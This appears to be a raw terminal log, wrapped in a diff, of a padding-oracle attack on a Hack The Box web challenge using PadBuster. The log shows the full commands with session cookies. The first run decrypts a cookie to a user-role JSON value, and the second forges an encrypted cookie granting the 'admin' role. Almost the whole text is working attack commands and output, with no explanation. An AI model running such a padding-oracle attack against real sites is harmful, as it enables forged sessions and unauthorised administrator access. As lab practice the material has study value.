@@ -1,0 +1,276 @@
+root@kali:~/HTB# padbuster http://docker.hackthebox.eu:45106/profile.php Dhz%2BBQ6niJdXOIFfh2sUU12SRougkvdUO4BIqMkXdpGDLvmcT0DoXn7ln4rZR4nXK093PR4oeDc%3D --cookies "_ga=GA1.2.2028934837.1551644006; _gid=GA1.2.945013094.1551644006; PHPSESSID=8cqmnqucgi3t444mv6sbdgcui1; iknowmag1k=Dhz%2BBQ6niJdXOIFfh2sUU12SRougkvdUO4BIqMkXdpGDLvmcT0DoXn7ln4rZR4nXK093PR4oeDc%3D" 8 --encoding=0
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 3857
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 6 ***
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#	Freq	Status	Length	Location
+-------------------------------------------------------
+1	1	200	3857	N/A
+2 **	255	500	2203	N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (84/256) [Byte 8]
+[+] Success: (88/256) [Byte 7]
+[+] Success: (42/256) [Byte 6]
+[+] Success: (145/256) [Byte 5]
+[+] Success: (141/256) [Byte 4]
+[+] Success: (115/256) [Byte 3]
+[+] Success: (199/256) [Byte 2]
+[+] Success: (131/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 5738815f876b1453
+[+] Intermediate Bytes (HEX): 753e8b766bd5aaad
+[+] Plain Text: {"user":
+
+Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
+*** Starting Block 2 of 6 ***
+
+[+] Success: (195/256) [Byte 8]
+[+] Success: (130/256) [Byte 7]
+[+] Success: (229/256) [Byte 6]
+[+] Success: (25/256) [Byte 5]
+[+] Success: (197/256) [Byte 4]
+[+] Success: (30/256) [Byte 3]
+[+] Success: (165/256) [Byte 2]
+[+] Success: (131/256) [Byte 1]
+
+Block 2 Results:
+[+] Cipher Text (HEX): 5d92468ba092f754
+[+] Intermediate Bytes (HEX): 755ce43ee3187c3c
+[+] Plain Text: "deadsho
+
+*** Starting Block 3 of 6 ***
+
+[+] Success: (208/256) [Byte 8]
+[+] Success: (103/256) [Byte 7]
+[+] Success: (2/256) [Byte 6]
+[+] Success: (42/256) [Byte 5]
+[+] Success: (84/256) [Byte 4]
+[+] Success: (148/256) [Byte 3]
+[+] Success: (73/256) [Byte 2]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45106 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (223/256) [Byte 1]
+
+Block 3 Results:
+[+] Cipher Text (HEX): 3b8048a8c9177691
+[+] Intermediate Bytes (HEX): 29b06aa9d2fd9b31
+[+] Plain Text: t","role
+
+*** Starting Block 4 of 6 ***
+
+[+] Success: (78/256) [Byte 8]
+[+] Success: (250/256) [Byte 7]
+[+] Success: (143/256) [Byte 6]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45106 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (66/256) [Byte 5]
+[+] Success: (40/256) [Byte 4]
+[+] Success: (148/256) [Byte 3]
+[+] Success: (67/256) [Byte 2]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45106 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (239/256) [Byte 1]
+
+Block 4 Results:
+[+] Cipher Text (HEX): 832ef99c4f40e85e
+[+] Intermediate Bytes (HEX): 19ba6addba7204b3
+[+] Plain Text: ":"user"
+
+*** Starting Block 5 of 6 ***
+
+[+] Success: (176/256) [Byte 8]
+[+] Success: (27/256) [Byte 7]
+[+] Success: (180/256) [Byte 6]
+[+] Success: (188/256) [Byte 5]
+[+] Success: (106/256) [Byte 4]
+[+] Success: (16/256) [Byte 3]
+[+] Success: (218/256) [Byte 2]
+[+] Success: (10/256) [Byte 1]
+
+Block 5 Results:
+[+] Cipher Text (HEX): 7ee59f8ad94789d7
+[+] Intermediate Bytes (HEX): fe21f693404fe751
+[+] Plain Text: }
+
+*** Starting Block 6 of 6 ***
+
+[+] Success: (39/256) [Byte 8]
+[+] Success: (124/256) [Byte 7]
+[+] Success: (181/256) [Byte 6]
+[+] Success: (46/256) [Byte 5]
+[+] Success: (128/256) [Byte 4]
+[+] Success: (106/256) [Byte 3]
+[+] Success: (19/256) [Byte 2]
+[+] Success: (135/256) [Byte 1]
+
+Block 6 Results:
+[+] Cipher Text (HEX): 2b4f773d1e287837
+[+] Intermediate Bytes (HEX): 71ea9085d64886d8
+[+] Plain Text: 
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): {"user":"deadshot","role":"user"}
+
+[+] Decrypted value (HEX): 7B2275736572223A226465616473686F74222C22726F6C65223A2275736572227D0F0F0F0F0F0F0F0F0F0F0F0F0F0F0F
+
+[+] Decrypted value (Base64): eyJ1c2VyIjoiZGVhZHNob3QiLCJyb2xlIjoidXNlciJ9Dw8PDw8PDw8PDw8PDw8P
+
+-------------------------------------------------------
+
+
+
+
+
+
+root@kali:~/HTB# padbuster http://docker.hackthebox.eu:45891/profile.php D%2FJGx%2FN87HsBAfde8cQJuwna%2BP%2Bb%2FepTbfQF3n7SF5QaOxHJ9CJEHstAPk2V1rbIMK00YN%2FzVJM%3D --cookies "_ga=GA1.2.414910529.1551690423; _gid=GA1.2.172107543.1551690423; PHPSESSID=pekpl9p9b2ak4gloe9oph5guv4; iknowmag1k=D%2FJGx%2FN87HsBAfde8cQJuwna%2BP%2Bb%2FepTbfQF3n7SF5QaOxHJ9CJEHstAPk2V1rbIMK00YN%2FzVJM%3D" 8 --encoding=0 --plaintext {\"user\":\"admin\"\,\"role\":\"admin\"}
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 3857
+
+INFO: Starting PadBuster Encrypt Mode
+[+] Number of Blocks: 4
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#	Freq	Status	Length	Location
+-------------------------------------------------------
+1	1	200	3857	N/A
+2 **	255	500	2203	N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (97/256) [Byte 8]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45891 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (155/256) [Byte 7]
+[+] Success: (87/256) [Byte 6]
+[+] Success: (153/256) [Byte 5]
+[+] Success: (61/256) [Byte 4]
+[+] Success: (188/256) [Byte 3]
+[+] Success: (151/256) [Byte 2]
+[+] Success: (167/256) [Byte 1]
+
+Block 4 Results:
+[+] New Cipher Text (HEX): 300a2faf0d881a9f
+[+] Intermediate Bytes (HEX): 516e42c663aa679e
+
+[+] Success: (197/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (51/256) [Byte 6]
+[+] Success: (253/256) [Byte 5]
+[+] Success: (25/256) [Byte 4]
+[+] Success: (182/256) [Byte 3]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45891 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (226/256) [Byte 2]
+[+] Success: (96/256) [Byte 1]
+
+Block 3 Results:
+[+] New Cipher Text (HEX): 8a6b238e62ec8b18
+[+] Intermediate Bytes (HEX): a8194ce207ceb13a
+
+[+] Success: (203/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (130/256) [Byte 6]
+[+] Success: (176/256) [Byte 5]
+[+] Success: (129/256) [Byte 4]
+[+] Success: (80/256) [Byte 3]
+[+] Success: (53/256) [Byte 2]
+[+] Success: (14/256) [Byte 1]
+
+Block 2 Results:
+[+] New Cipher Text (HEX): d8add2173d139318
+[+] Intermediate Bytes (HEX): faccb67a547db134
+
+[+] Success: (83/256) [Byte 8]
+[+] Success: (107/256) [Byte 7]
+ERROR: 500 Can't connect to docker.hackthebox.eu:45891 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (221/256) [Byte 6]
+[+] Success: (52/256) [Byte 5]
+[+] Success: (219/256) [Byte 4]
+[+] Success: (207/256) [Byte 3]
+[+] Success: (59/256) [Byte 2]
+ERROR: No matching response on [Byte 1]
+       Automatically trying one more time...
+ERROR: No matching response on [Byte 8]
+Do you want to start this block over? (Yes/No)? [y/n/a] : y
+INFO: Switching to interactive mode
+[+] Success: (83/256) [Byte 8]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (107/256) [Byte 7]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (221/256) [Byte 6]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (52/256) [Byte 5]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (219/256) [Byte 4]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (207/256) [Byte 3]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (239/256) [Byte 2]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (161/256) [Byte 1]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+
+Block 1 Results:
+[+] New Cipher Text (HEX): 2c344253ad52b596
+[+] Intermediate Bytes (HEX): 57163720c82097ac
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
+-------------------------------------------------------
+
+
